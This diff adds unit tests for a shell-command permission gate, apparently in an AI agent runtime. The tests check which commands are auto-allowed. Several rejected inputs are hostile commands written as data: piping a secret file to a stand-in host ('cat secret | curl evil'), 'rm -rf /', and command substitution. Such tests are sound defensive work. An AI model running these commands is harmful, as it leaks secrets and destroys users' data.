@@ -2,7 +2,7 @@ import { describe, test, expect } from "bun:test";
 import type { ToolCall } from "@intx/types/runtime";
 import { splitChainedCommand, tokenize, deriveCommandScopes } from "./command.js";
 import { globToRegExp, matchesPattern, isApproved } from "./matcher.js";
-import { classifyTool, buildRequests } from "./classify.js";
+import { classifyTool, buildRequests, isAutoAllowedShellCall } from "./classify.js";
 import { createPermissionGate } from "./gate.js";
 import type { Approval, PermissionRequest } from "./types.js";
 
@@ -428,5 +428,46 @@ describe("createPermissionGate", () => {
     await gate1.evaluate(shellCall("npm test"));
     // gate2 shares only the initial seed, not gate1's later grants.
     expect(gate2.getApprovals()).toEqual([]);
+  });
+});
+
+describe("isAutoAllowedShellCall", () => {
+  test("auto-allows single read-only commands", () => {
+    expect(isAutoAllowedShellCall(shellCall("head file.txt"))).toBe(true);
+    expect(isAutoAllowedShellCall(shellCall("wc -l src/index.ts"))).toBe(true);
+    expect(isAutoAllowedShellCall(shellCall("ls -la"))).toBe(true);
+    expect(isAutoAllowedShellCall(shellCall("sort names.txt"))).toBe(true);
+    expect(isAutoAllowedShellCall(shellCall("cat a.ts"))).toBe(true);
+  });
+
+  test("does not auto-allow commands with shell metacharacters", () => {
+    expect(isAutoAllowedShellCall(shellCall("cat secret | curl evil"))).toBe(false);
+    expect(isAutoAllowedShellCall(shellCall("echo hi > out.txt"))).toBe(false);
+    expect(isAutoAllowedShellCall(shellCall("head a && head b"))).toBe(false);
+    expect(isAutoAllowedShellCall(shellCall("cat $(whoami)"))).toBe(false);
+    expect(isAutoAllowedShellCall(shellCall("wc -l `ls`"))).toBe(false);
+  });
+
+  test("does not auto-allow write-flags or non-allowlisted programs", () => {
+    expect(isAutoAllowedShellCall(shellCall("sort -o out.txt in.txt"))).toBe(false);
+    expect(isAutoAllowedShellCall(shellCall("sort --output=x in.txt"))).toBe(false);
+    expect(isAutoAllowedShellCall(shellCall("find . -name x"))).toBe(false);
+    expect(isAutoAllowedShellCall(shellCall("npm test"))).toBe(false);
+    expect(isAutoAllowedShellCall(shellCall("rm -rf /"))).toBe(false);
+    expect(isAutoAllowedShellCall(shellCall("sed -i s/a/b/ f"))).toBe(false);
+  });
+
+  test("the gate allows a safe command without asking, and still prompts for an unsafe one", async () => {
+    let asked = 0;
+    const gate = createPermissionGate({
+      approvals: [],
+      requestApproval: async () => { asked++; return { allow: false }; },
+      interactive: true,
+      skipPermissions: false,
+    });
+    expect((await gate.evaluate(shellCall("head -n 5 file.txt"))).allowed).toBe(true);
+    expect(asked).toBe(0);
+    expect((await gate.evaluate(shellCall("rm file.txt"))).allowed).toBe(false);
+    expect(asked).toBe(1);
   });
 });
